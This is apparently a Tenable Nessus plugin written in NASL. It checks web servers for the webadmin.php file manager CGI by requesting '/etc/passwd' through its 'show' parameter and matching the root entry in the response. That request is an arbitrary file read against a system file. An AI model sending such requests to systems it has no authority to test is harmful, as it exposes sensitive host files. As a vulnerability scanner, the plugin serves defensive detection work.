#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(18586);
 script_version ("$Revision: 1.11 $");
 script_osvdb_id(54622);
 script_cvs_date("$Date: 2013/01/25 01:19:11 $");

 script_name(english:"webadmin.php show Parameter Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files on the remote host.");
 script_set_attribute(attribute:"description", value:
"webadmin.php was found on your web server.  In its current
configuration, this file manager CGI gives access to the whole
filesystem of the machine to anybody." );
 script_set_attribute(attribute:"solution", value:
"Restrict access to this CGI or remove it." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/29");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Try to read /etc/passwd through webadmin.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# if (get_kb_item('http/auth')) exit(0);	# CGI might be protected

port = get_http_port(default:80);

# if (get_kb_item('/tmp/http/auth/'+port)) exit(0);	# CGI might be protected

foreach dir (cgi_dirs())
{
 r = http_send_recv3(port: port, method:"GET", item: dir + '/webadmin.php?show=%2Fetc%2Fpasswd', 
 # CGI might be protected
   username: "", password: "");
 if (isnull(r)) exit(0, "The web server did not answer");

 if (r[0] =~ '^HTTP/1\\.[01] 200 ')
 {
   resp = strcat(r[0], r[1], '\r\n', r[2]);
   debug_print(dir+'/webadmin.php?show=%2Fetc%2Fpasswd = ', resp);
   if (egrep(string: resp, pattern: '^root:.*:0:[01]:'))
   {
     debug_print('Found ', dir+'/webadmin.php\n');
     security_hole(port);
     exit(0);
    }
  }
}

